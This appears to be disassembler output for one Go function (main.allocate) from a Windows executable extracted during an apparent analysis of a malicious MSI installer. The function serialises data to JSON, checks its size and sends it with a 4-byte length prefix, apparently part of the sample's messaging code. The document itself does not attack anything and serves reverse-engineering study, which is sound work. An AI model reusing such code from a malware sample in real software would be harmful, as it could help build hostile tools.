
/home/ubuntu/malicious_msi_decode/analysis/extracted/support_v1.3/demand.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140277760 <.text+0x276760>:
   140277760 <main.allocate>:	49 3b 66 10          	cmp    rsp,QWORD PTR [r14+0x10]
   140277764:	0f 86 91 01 00 00    	jbe    0x1402778fb
   14027776a:	55                   	push   rbp
   14027776b:	48 89 e5             	mov    rbp,rsp
   14027776e:	48 83 ec 68          	sub    rsp,0x68
   140277772:	4c 89 84 24 a0 00 00 	mov    QWORD PTR [rsp+0xa0],r8
   140277779:	00 
   14027777a:	48 89 b4 24 98 00 00 	mov    QWORD PTR [rsp+0x98],rsi
   140277781:	00 
   140277782:	48 89 bc 24 90 00 00 	mov    QWORD PTR [rsp+0x90],rdi
   140277789:	00 
   14027778a:	48 89 8c 24 88 00 00 	mov    QWORD PTR [rsp+0x88],rcx
   140277791:	00 
   140277792:	48 89 9c 24 80 00 00 	mov    QWORD PTR [rsp+0x80],rbx
   140277799:	00 
   14027779a:	48 89 44 24 78       	mov    QWORD PTR [rsp+0x78],rax
   14027779f:	90                   	nop
   1402777a0:	e8 7b 08 00 00       	call   0x140278020 <main.incorporate>
   1402777a5:	48 8b 8c 24 90 00 00 	mov    rcx,QWORD PTR [rsp+0x90]
   1402777ac:	00 
   1402777ad:	48 85 c9             	test   rcx,rcx
   1402777b0:	ba 07 00 00 00       	mov    edx,0x7
   1402777b5:	48 0f 44 ca          	cmove  rcx,rdx
   1402777b9:	48 8b 94 24 88 00 00 	mov    rdx,QWORD PTR [rsp+0x88]
   1402777c0:	00 
   1402777c1:	48 8d 35 16 db 0e 00 	lea    rsi,[rip+0xedb16]        # 0x1403652de 'unknownnil keynumber windowsrunningwsarecvwsasendconnectlookup writetoPATHEXTabortedCopySidWSARecvWS'
   1402777c8:	48 0f 44 d6          	cmove  rdx,rsi
   1402777cc:	48 89 54 24 38       	mov    QWORD PTR [rsp+0x38],rdx
   1402777d1:	48 89 4c 24 40       	mov    QWORD PTR [rsp+0x40],rcx
   1402777d6:	48 8b 8c 24 98 00 00 	mov    rcx,QWORD PTR [rsp+0x98]
   1402777dd:	00 
   1402777de:	48 89 4c 24 48       	mov    QWORD PTR [rsp+0x48],rcx
   1402777e3:	48 8b 8c 24 a0 00 00 	mov    rcx,QWORD PTR [rsp+0xa0]
   1402777ea:	00 
   1402777eb:	48 89 4c 24 50       	mov    QWORD PTR [rsp+0x50],rcx
   1402777f0:	48 89 44 24 58       	mov    QWORD PTR [rsp+0x58],rax
   1402777f5:	48 89 5c 24 60       	mov    QWORD PTR [rsp+0x60],rbx
   1402777fa:	48 8d 05 7f 7f 0b 00 	lea    rax,[rip+0xb7f7f]        # 0x14032f780 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\\xbe\\xe1\x0f>\x07\x08\x08\x19P\x14-@\x01\x00\x00\x00X >@\x01\x00\x00\x00\\x97f\x00\x00@\\x97\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\\xe0\\xf72@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xae\x05\x00\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00{\x1a.@'
   140277801:	48 8d 5c 24 38       	lea    rbx,[rsp+0x38]
   140277806:	e8 35 af d9 ff       	call   0x140012740 <runtime.convT>
   14027780b:	48 89 c3             	mov    rbx,rax
   14027780e:	48 8d 05 6b 7f 0b 00 	lea    rax,[rip+0xb7f6b]        # 0x14032f780 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\\xbe\\xe1\x0f>\x07\x08\x08\x19P\x14-@\x01\x00\x00\x00X >@\x01\x00\x00\x00\\x97f\x00\x00@\\x97\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\\xe0\\xf72@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xae\x05\x00\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00{\x1a.@'
   140277815:	e8 a6 37 e8 ff       	call   0x1400fafc0 <encoding/json.Marshal>
   14027781a:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
   140277820:	48 85 ff             	test   rdi,rdi
   140277823:	0f 85 c6 00 00 00    	jne    0x1402778ef
   140277829:	48 85 db             	test   rbx,rbx
   14027782c:	74 09                	je     0x140277837
   14027782e:	48 81 fb 00 00 01 00 	cmp    rbx,0x10000
   140277835:	7e 30                	jle    0x140277867
   140277837:	48 8d 05 a2 d9 09 00 	lea    rax,[rip+0x9d9a2]        # 0x1403151e0 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb7\x00\\x81\\x8e\x07\x08\x08\x19\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00-\\xe8\x00\x00 @\x03\x00\\xf0\x15-@\x01\x00\x00\x00@R1@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\\xf0\x15\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00&\x00-@'
   14027783e:	66 90                	xchg   ax,ax
   140277840:	e8 bb eb d9 ff       	call   0x140016400 <runtime.newobject>
   140277845:	48 c7 40 08 0e 00 00 	mov    QWORD PTR [rax+0x8],0xe
   14027784c:	00 
   14027784d:	48 8d 0d 71 fe 0e 00 	lea    rcx,[rip+0xefe71]        # 0x1403676c5 'bad hello size.WithoutCancel.WithDeadline(unexpected EOFinternal errorgetprotobynameunknown mode: fi'
   140277854:	48 89 08             	mov    QWORD PTR [rax],rcx
   140277857:	48 89 c3             	mov    rbx,rax
   14027785a:	48 8d 05 df e3 16 00 	lea    rax,[rip+0x16e3df]        # 0x1403e5c40 '\\xc0\\xdc0@\x01\x00\x00\x00 @0@\x01\x00\x00\x00\\xa0\\xd23\\x8f\x00\x00\x00\x00\\xe0,\x08@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\\xe0\\xc35@\x01\x00\x00\x00Z\\xdd\x11\\x9f\x00\x00\x00\x00`\\xa4\r@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00\\x80R2@\x01\x00\x00\x00\x7fJo\\xf6\x00\x00\x00\x00\\xa0\\xc3\n@\x01\x00\x00\x00\\xc0\\xdc0@'
   140277861:	48 83 c4 68          	add    rsp,0x68
   140277865:	5d                   	pop    rbp
   140277866:	c3                   	ret
   140277867:	48 89 4c 24 28       	mov    QWORD PTR [rsp+0x28],rcx
   14027786c:	48 89 5c 24 20       	mov    QWORD PTR [rsp+0x20],rbx
   140277871:	48 89 44 24 30       	mov    QWORD PTR [rsp+0x30],rax
   140277876:	48 8d 05 83 16 08 00 	lea    rax,[rip+0x81683]        # 0x1402f8f00 '\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\\x9aڮ\n\x01\x01\x11\\xc0I8@\x01\x00\x00\x00\\xe82>@\x01\x00\x00\x00dB\x00\x00\x00\x00\x00\x00\x00S/@\x01\x00\x00\x00\\xa0\x1e/@\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00'
   14027787d:	0f 1f 00             	nop    DWORD PTR [rax]
   140277880:	e8 7b eb d9 ff       	call   0x140016400 <runtime.newobject>
   140277885:	48 8b 4c 24 20       	mov    rcx,QWORD PTR [rsp+0x20]
   14027788a:	0f c9                	bswap  ecx
   14027788c:	90                   	nop
   14027788d:	89 08                	mov    DWORD PTR [rax],ecx
   14027788f:	48 8b 4c 24 78       	mov    rcx,QWORD PTR [rsp+0x78]
   140277894:	48 8b 49 18          	mov    rcx,QWORD PTR [rcx+0x18]
   140277898:	48 89 c3             	mov    rbx,rax
   14027789b:	bf 04 00 00 00       	mov    edi,0x4
   1402778a0:	48 8b 84 24 80 00 00 	mov    rax,QWORD PTR [rsp+0x80]
   1402778a7:	00 
   1402778a8:	48 89 ca             	mov    rdx,rcx
   1402778ab:	48 89 f9             	mov    rcx,rdi
   1402778ae:	ff d2                	call   rdx
   1402778b0:	48 85 db             	test   rbx,rbx
   1402778b3:	74 0c                	je     0x1402778c1
   1402778b5:	48 89 d8             	mov    rax,rbx
   1402778b8:	48 89 cb             	mov    rbx,rcx
   1402778bb:	48 83 c4 68          	add    rsp,0x68
   1402778bf:	5d                   	pop    rbp
   1402778c0:	c3                   	ret
   1402778c1:	48 8b 54 24 78       	mov    rdx,QWORD PTR [rsp+0x78]
   1402778c6:	48 8b 52 18          	mov    rdx,QWORD PTR [rdx+0x18]
   1402778ca:	48 8b 84 24 80 00 00 	mov    rax,QWORD PTR [rsp+0x80]
   1402778d1:	00 
   1402778d2:	48 8b 5c 24 30       	mov    rbx,QWORD PTR [rsp+0x30]
   1402778d7:	48 8b 4c 24 20       	mov    rcx,QWORD PTR [rsp+0x20]
   1402778dc:	48 8b 7c 24 28       	mov    rdi,QWORD PTR [rsp+0x28]
   1402778e1:	ff d2                	call   rdx
   1402778e3:	48 89 d8             	mov    rax,rbx
   1402778e6:	48 89 cb             	mov    rbx,rcx
   1402778e9:	48 83 c4 68          	add    rsp,0x68
   1402778ed:	5d                   	pop    rbp
   1402778ee:	c3                   	ret
   1402778ef:	48 89 f8             	mov    rax,rdi
   1402778f2:	48 89 f3             	mov    rbx,rsi
   1402778f5:	48 83 c4 68          	add    rsp,0x68
   1402778f9:	5d                   	pop    rbp
   1402778fa:	c3                   	ret
   1402778fb:	48 89 44 24 08       	mov    QWORD PTR [rsp+0x8],rax
   140277900:	48 89 5c 24 10       	mov    QWORD PTR [rsp+0x10],rbx
   140277905:	48 89 4c 24 18       	mov    QWORD PTR [rsp+0x18],rcx
   14027790a:	48 89 7c 24 20       	mov    QWORD PTR [rsp+0x20],rdi
   14027790f:	48 89 74 24 28       	mov    QWORD PTR [rsp+0x28],rsi
   140277914:	4c 89 44 24 30       	mov    QWORD PTR [rsp+0x30],r8
   140277919:	e8 02 10 e0 ff       	call   0x140078920 <runtime.morestack_noctxt>
   14027791e:	48 8b 44 24 08       	mov    rax,QWORD PTR [rsp+0x8]
   140277923:	48 8b 5c 24 10       	mov    rbx,QWORD PTR [rsp+0x10]
   140277928:	48 8b 4c 24 18       	mov    rcx,QWORD PTR [rsp+0x18]
   14027792d:	48 8b 7c 24 20       	mov    rdi,QWORD PTR [rsp+0x20]
   140277932:	48 8b 74 24 28       	mov    rsi,QWORD PTR [rsp+0x28]
   140277937:	4c 8b 44 24 30       	mov    r8,QWORD PTR [rsp+0x30]
   14027793c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   140277940:	e9 1b fe ff ff       	jmp    0x140277760 <main.allocate>
   140277945:	cc                   	int3
   140277946:	cc                   	int3
   140277947:	cc                   	int3
   140277948:	cc                   	int3
   140277949:	cc                   	int3
   14027794a:	cc                   	int3
   14027794b:	cc                   	int3
   14027794c:	cc                   	int3
   14027794d:	cc                   	int3
   14027794e:	cc                   	int3
   14027794f:	cc                   	int3
   140277950:	cc                   	int3
   140277951:	cc                   	int3
   140277952:	cc                   	int3
   140277953:	cc                   	int3
   140277954:	cc                   	int3
   140277955:	cc                   	int3
   140277956:	cc                   	int3
   140277957:	cc                   	int3
   140277958:	cc                   	int3
   140277959:	cc                   	int3
   14027795a:	cc                   	int3
   14027795b:	cc                   	int3
   14027795c:	cc                   	int3
   14027795d:	cc                   	int3
   14027795e:	cc                   	int3
   14027795f:	cc                   	int3
